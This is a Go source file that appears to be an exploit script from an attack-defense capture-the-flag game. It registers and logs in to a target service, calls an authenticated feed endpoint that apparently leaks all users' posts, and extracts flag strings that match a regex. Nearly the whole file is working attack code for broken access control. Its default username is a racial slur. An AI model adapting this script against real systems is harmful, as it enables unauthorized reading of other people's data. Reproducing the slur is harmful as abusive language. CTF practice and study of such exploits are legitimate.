package main

import (
	"bytes"
	"context"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
	"time"
)

const (
	defaultPort     = "3080"
	defaultUser     = "nigga"
	defaultPassword = "12345"
	defaultPath     = "/feed/_PostManager__get_all"
	defaultRegex    = `c01d[a-z0-9]{4}-[a-z0-9]{4}-[a-z0-9]{4}-[a-z0-9]{4}-[a-z0-9]{4}[0-9]{8}`
	defaultTimeout  = 4.0
	maxRuntime      = 24 * time.Second
)

type requestResult struct {
	Method   string
	Path     string
	Status   int
	Duration time.Duration
	Body     []byte
	Err      error
}

type sxClient struct {
	baseURL string
	client  *http.Client
}

type sessionPayload struct {
	AccessToken string `json:"access_token"`
}

func logf(format string, args ...any) {
	fmt.Fprintf(os.Stderr, format+"\n", args...)
}

func normalizeTarget(raw string) (string, error) {
	raw = strings.TrimSpace(raw)
	if raw == "" {
		return "", fmt.Errorf("missing target")
	}
	if !strings.Contains(raw, "://") {
		raw = "http://" + raw
	}
	parsed, err := url.Parse(raw)
	if err != nil {
		return "", err
	}
	host := parsed.Hostname()
	if host == "" {
		return "", fmt.Errorf("invalid target")
	}
	return fmt.Sprintf("http://%s:%s", host, defaultPort), nil
}

func newSXClient(baseURL string, timeout time.Duration) *sxClient {
	transport := &http.Transport{
		DialContext: (&net.Dialer{
			Timeout: timeout,
		}).DialContext,
		MaxIdleConns:        8,
		MaxIdleConnsPerHost: 8,
		IdleConnTimeout:     15 * time.Second,
	}
	return &sxClient{
		baseURL: strings.TrimRight(baseURL, "/"),
		client: &http.Client{
			Timeout:   timeout,
			Transport: transport,
		},
	}
}

func (c *sxClient) doRequest(ctx context.Context, method, path string, headers http.Header, body []byte, contentType string) requestResult {
	start := time.Now()
	var reader io.Reader
	if body != nil {
		reader = bytes.NewReader(body)
	}
	req, err := http.NewRequestWithContext(ctx, method, c.baseURL+path, reader)
	if err != nil {
		return requestResult{Method: method, Path: path, Err: err}
	}
	if headers != nil {
		for key, values := range headers {
			for _, value := range values {
				req.Header.Add(key, value)
			}
		}
	}
	req.Header.Set("Accept", "application/json")
	if contentType != "" {
		req.Header.Set("Content-Type", contentType)
	}

	resp, err := c.client.Do(req)
	if err != nil {
		return requestResult{Method: method, Path: path, Duration: time.Since(start), Err: err}
	}
	defer resp.Body.Close()
	respBody, readErr := io.ReadAll(resp.Body)
	return requestResult{
		Method:   method,
		Path:     path,
		Status:   resp.StatusCode,
		Duration: time.Since(start),
		Body:     respBody,
		Err:      readErr,
	}
}

func bearerHeaders(token string) http.Header {
	headers := make(http.Header)
	if token != "" {
		headers.Set("Authorization", "Bearer "+token)
	}
	return headers
}

func trimToken(body []byte) string {
	var payload sessionPayload
	if err := json.Unmarshal(body, &payload); err != nil {
		return ""
	}
	return payload.AccessToken
}

func randString(n int) string {
	const alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	var b strings.Builder
	b.Grow(n)
	for i := 0; i < n; i++ {
		b.WriteByte(alphabet[rand.Intn(len(alphabet))])
	}
	return b.String()
}

func userPayload(username, password string) map[string]any {
	return map[string]any{
		"username": username,
		"fullname": username,
		"bio":      "sx-safe-check",
		"password": password,
	}
}

func printRequest(res requestResult, extra string) {
	if res.Err != nil {
		logf("%s %s -> error=%v time=%dms", res.Method, res.Path, res.Err, res.Duration.Milliseconds())
		return
	}
	if extra != "" {
		logf("%s %s -> %d time=%dms %s", res.Method, res.Path, res.Status, res.Duration.Milliseconds(), extra)
		return
	}
	logf("%s %s -> %d time=%dms", res.Method, res.Path, res.Status, res.Duration.Milliseconds())
}

func walkStrings(value any, out *[]string) {
	switch typed := value.(type) {
	case map[string]any:
		for _, child := range typed {
			walkStrings(child, out)
		}
	case []any:
		for _, child := range typed {
			walkStrings(child, out)
		}
	case string:
		*out = append(*out, typed)
	}
}

func extractFlags(body []byte, marker string, pattern *regexp.Regexp) []string {
	if len(body) == 0 {
		return nil
	}
	var parsed any
	if err := json.Unmarshal(body, &parsed); err != nil {
		return nil
	}
	var stringsFound []string
	walkStrings(parsed, &stringsFound)

	seen := make(map[string]struct{})
	for _, value := range stringsFound {
		if marker != "" && !strings.Contains(value, marker) {
			continue
		}
		for _, token := range strings.Fields(value) {
			token = strings.Trim(token, ".,:;!?'\"()[]{}")
			if marker != "" && !strings.Contains(token, marker) {
				continue
			}
			if pattern.MatchString(token) {
				seen[token] = struct{}{}
			}
		}
	}
	flags := make([]string, 0, len(seen))
	for f := range seen {
		flags = append(flags, f)
	}
	return flags
}

func main() {
	rand.Seed(time.Now().UnixNano())

	var (
		timeoutSeconds float64
		workers        int
		path           string
		regexText      string
		user           string
		password       string
		marker         string
	)

	flag.Float64Var(&timeoutSeconds, "timeout", defaultTimeout, "per-request timeout in seconds")
	flag.IntVar(&workers, "workers", 4, "kept for compatibility")
	flag.StringVar(&path, "path", defaultPath, "authenticated path to probe")
	flag.StringVar(&regexText, "regex", defaultRegex, "match regex")
	flag.StringVar(&user, "user", defaultUser, "login username")
	flag.StringVar(&password, "password", defaultPassword, "login password")
	flag.StringVar(&marker, "marker", "c01d", "marker filter before regex")
	flag.Parse()

	_ = workers

	if flag.NArg() != 1 {
		logf("expected exactly one positional target host/IP")
		os.Exit(1)
	}

	pattern, err := regexp.Compile(regexText)
	if err != nil {
		logf("invalid regex: %v", err)
		os.Exit(1)
	}

	baseURL, err := normalizeTarget(flag.Arg(0))
	if err != nil {
		logf("invalid target: %v", err)
		os.Exit(1)
	}
	logf("target=%s", baseURL)

	perRequestTimeout := time.Duration(timeoutSeconds * float64(time.Second))
	if perRequestTimeout <= 0 {
		perRequestTimeout = time.Duration(defaultTimeout * float64(time.Second))
	}

	client := newSXClient(baseURL, perRequestTimeout)
	ctx, cancel := context.WithTimeout(context.Background(), maxRuntime)
	defer cancel()

	username := user
	loginPassword := password
	registerPassword := password
	if username == "" {
		username = "sxsafe_" + randString(10)
		loginPassword = defaultPassword
		registerPassword = defaultPassword
	}

	registerRes := client.doRequest(ctx, http.MethodPost, "/users", nil, mustJSON(userPayload(username, registerPassword)), "application/json")
	printRequest(registerRes, "")

	form := url.Values{}
	form.Set("username", username)
	form.Set("password", loginPassword)
	loginRes := client.doRequest(ctx, http.MethodPost, "/session", nil, []byte(form.Encode()), "application/x-www-form-urlencoded")
	token := ""
	if loginRes.Err == nil && loginRes.Status >= 200 && loginRes.Status < 300 {
		token = trimToken(loginRes.Body)
	}
	extra := ""
	if token != "" {
		extra = "token=ok"
	}
	printRequest(loginRes, extra)
	if loginRes.Err != nil || loginRes.Status < 200 || loginRes.Status >= 300 || token == "" {
		logf("authentication failed")
		os.Exit(1)
	}

	vulnRes := client.doRequest(ctx, http.MethodGet, path, bearerHeaders(token), nil, "")
	printRequest(vulnRes, "")
	if vulnRes.Err != nil {
		logf("request failed: %v", vulnRes.Err)
		os.Exit(1)
	}

	if vulnRes.Status != 200 {
		logf("endpoint returned status %d, expected 200 for vulnerability", vulnRes.Status)
		os.Exit(0)
	}

	flags := extractFlags(vulnRes.Body, marker, pattern)
	logf("matches=%d", len(flags))

	for _, flag := range flags {
		fmt.Println(flag)
		os.Stdout.Sync()
	}
	logf("summary=flags=%d", len(flags))
}

func mustJSON(payload any) []byte {
	body, err := json.Marshal(payload)
	if err != nil {
		return []byte("{}")
	}
	return body
}
